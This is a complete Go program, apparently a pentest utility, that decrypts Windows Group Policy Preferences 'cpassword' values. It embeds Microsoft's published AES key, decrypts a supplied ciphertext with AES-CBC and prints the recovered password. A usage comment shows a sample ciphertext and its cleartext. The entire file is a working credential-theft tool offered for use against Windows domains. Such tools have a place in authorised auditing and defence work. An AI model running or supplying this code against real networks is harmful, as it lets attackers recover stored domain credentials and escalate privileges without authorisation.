/*
Decrypts GPP Passwords.

References: 
https://github.com/leonteale/pentestpackage/blob/master/Gpprefdecrypt.py
https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
Chris Campbell (@obscuresec)

Usage: 
gppdecrypt.exe j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
L o c a l * P 4 s s w o r d !
*/
package main

import (
		"os"
		"log"
		"fmt"
		"strings"
		"encoding/base64"
		"encoding/hex"
		"crypto/aes"
		"crypto/cipher"
)

func main() {

	cpassword := os.Args[1]

	// 32 byte AES key
	// http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2
	key := "4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b"

	// hex decode the key
	decoded, _ := hex.DecodeString(key)
	block, err := aes.NewCipher(decoded)
	if err != nil {
		log.Fatal(err)
	}

	// add padding to base64 cpassword if necessary
	m := len(cpassword) % 4
	if m != 0 {
		cpassword += strings.Repeat("=", 4-m)
	}

	// base64 decode cpassword
	decodedpassword, errs := base64.StdEncoding.DecodeString(cpassword)
	if errs != nil {
		log.Fatal(errs)
	}

	if len(decodedpassword) < aes.BlockSize {
		log.Fatal("Cpassword block size too short...\n")
	}

	var iv = []byte{00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00}

	if (len(decodedpassword) % aes.BlockSize) != 0 {
		log.Fatal("Blocksize must be multiple of decoded message length...\n")
	}

	cbc := cipher.NewCBCDecrypter(block, iv)
	cbc.CryptBlocks(decodedpassword, decodedpassword)

	// remove the padding at the end of password
	length := len(decodedpassword)
	unpadding := int(decodedpassword[length-1])
	clear := decodedpassword[:(length - unpadding)]

	fmt.Printf("%s\n", string(clear))
}